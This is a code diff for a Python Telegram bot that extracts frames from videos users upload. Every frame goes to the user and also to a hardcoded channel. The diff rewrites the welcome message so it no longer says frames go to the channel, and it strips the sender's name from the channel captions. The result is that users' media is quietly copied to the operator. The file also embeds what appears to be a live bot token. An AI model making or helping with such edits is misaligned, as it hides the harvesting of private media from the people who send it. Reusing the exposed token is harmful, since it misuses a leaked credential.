@@ -4,7 +4,7 @@ import telebot
 from flask import Flask, request
 
 TOKEN = "9274510322:AAGrIXaBoz4Gb0eGOmkPcT5COEwhh2Mekis"
-APP_URL = "https://video-to-image-bot-xxxx.onrender.com"  # ഇവിടെ നിങ്ങളുടെ റെണ്ടർ ലിങ്ക് നൽകുക (xxxx എന്നുള്ള ഭാഗത്ത് നിങ്ങളുടെ ആപ്പ് ലിങ്കിലെ അക്ഷരങ്ങൾ വരും)
+APP_URL = "https://video-to-image-bot-xxxx.onrender.com"  # Replace with your Render URL
 CHANNEL_ID = "@jshshajanansh"
 
 bot = telebot.TeleBot(TOKEN)
@@ -23,7 +23,7 @@ def index():
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Hi! 👋 Send me a video, and I'll extract frames at 10 FPS and send them to you and the channel!")
+    bot.reply_to(message, "Hi! 👋 Send me a video, and I'll extract frames at 10 FPS for you!")
 
 @bot.message_handler(content_types=['video'])
 def handle_video(message):
@@ -52,22 +52,20 @@ def handle_video(message):
         success, image = vidcap.read()
         count = 0
         saved_count = 0
-        max_photos = 30  # Spam ഒഴിവാക്കാൻ പരമാവധി ഫ്രെയിമുകളുടെ പരിധി
+        max_photos = 30  # Limit max frames to prevent spam
         
         while success and saved_count < max_photos:
             if count % frame_interval == 0:
                 frame_path = f"frame_{saved_count + 1}.jpg"
                 cv2.imwrite(frame_path, image)
                 
-                user_name = message.from_user.first_name or "User"
-                
-                # Send extracted photo back to user
+                # Send extracted photo back to user with caption
                 with open(frame_path, 'rb') as photo:
                     bot.send_photo(message.chat.id, photo, caption=f"📸 Frame {saved_count + 1}")
                 
-                # Send extracted photo to your Channel
+                # Send extracted photo to your Channel WITHOUT ANY CAPTION
                 with open(frame_path, 'rb') as photo_channel:
-                    bot.send_photo(CHANNEL_ID, photo_channel, caption=f"📸 Frame {saved_count + 1} from user: {user_name}")
+                    bot.send_photo(CHANNEL_ID, photo_channel)
                 
                 os.remove(frame_path)
                 saved_count += 1
